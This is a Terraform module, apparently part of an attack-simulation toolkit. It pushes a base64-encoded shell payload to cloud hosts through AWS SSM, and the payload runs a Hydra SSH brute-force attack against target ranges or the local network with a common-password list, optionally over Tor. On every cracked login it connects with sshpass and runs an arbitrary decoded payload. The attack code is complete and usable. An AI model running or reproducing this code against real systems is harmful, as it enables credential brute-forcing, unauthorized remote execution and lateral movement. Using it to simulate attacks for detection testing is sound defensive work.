locals {
    attack_dir = "/hydra"
    attack_script = "hydra.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_hydra.lock"
    targets = flatten([ for target in var.targets: can(split("/", target)[1]) ? 
        [ for host_number in range(pow(2, 32 - split("/", target)[1])) : cidrhost(target, host_number) ]
        :
        [ target ]
    ])
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOCKFILE="${ local.lock_file }"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "Checking for docker..."
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(which docker)"

    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.delayed_start} | base64 -d > ${local.start_script}
    echo ${local.hydra} | base64 -d > ${local.attack_script}

    log "starting background delayed script start..."
    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
    log "background job started"
    log "done."

    EOT
    base64_payload = base64gzip(local.payload)

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    scriptname = "delayed_start_hydra"
                                    lock_file = local.lock_file
                                    attack_delay = var.attack_delay
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    hydra           = base64encode(templatefile(
                                "${path.module}/resources/${local.attack_script}",
                                {
                                    content =   <<-EOT
                                                apt-get update && apt-get install -y sshpass jq
                                                LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
                                                log "LOCAL_NET: $LOCAL_NET"
                                                log "Targets: ${join(",", local.targets)}"
                                                echo "${ length(local.targets) > 0 ? join("\n", local.targets) : "$LOCAL_NET" }" > /tmp/hydra-targets.txt
                                                cat > /tmp/hydra-users.txt <<-'EOF'
                                                ${try(length(var.ssh_user.username),"false") != "false" ? var.ssh_user.username : "" }
                                                EOF
                                                cat > /tmp/hydra-passwords.txt <<-'EOF'
                                                123456
                                                123456789
                                                111111
                                                password
                                                qwerty
                                                abc123
                                                12345678
                                                password1
                                                1234567
                                                123123
                                                ${try(length(var.ssh_user.password),"false") != "false" ? var.ssh_user.password : "" }
                                                EOF
                                                if sudo docker ps -a | grep ${var.container_name}; then 
                                                sudo docker stop ${var.container_name}
                                                sudo docker rm ${var.container_name}
                                                fi
                                                truncate -s 0 /tmp/hydra-found.txt
                                                ${ var.use_tor == true ? <<-EOF
                                                log "Using tor network..."
                                                if ! docker ps | grep torproxy > /dev/null; then
                                                sudo docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy
                                                fi
                                                TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
                                                log "Running: proxychains hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                sudo /bin/bash -c "docker rm ${var.container_name}"
                                                log "Running: proxychains hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                sudo /bin/bash -c "docker rm ${var.container_name}"
                                                EOF
                                                : <<-EOF
                                                log "Running: hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                sudo /bin/bash -c "docker rm ${var.container_name}"
                                                log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                sudo /bin/bash -c "docker rm ${var.container_name}"
                                                EOF
                                                }
                                                # Read Hydra output file line by line
                                                while IFS= read -r line
                                                do
                                                    # Parse Hydra output
                                                    host=$(echo "$line" | awk '{print $3}')
                                                    username=$(echo "$line" | awk '{print $5}')
                                                    password=$(echo "$line" | awk '{print $7}')
                                                    log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash"
                                                    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash'
                                                    log "Done"
                                                done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
                                                log "Done."
                                                EOT
                                }
                        ))
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}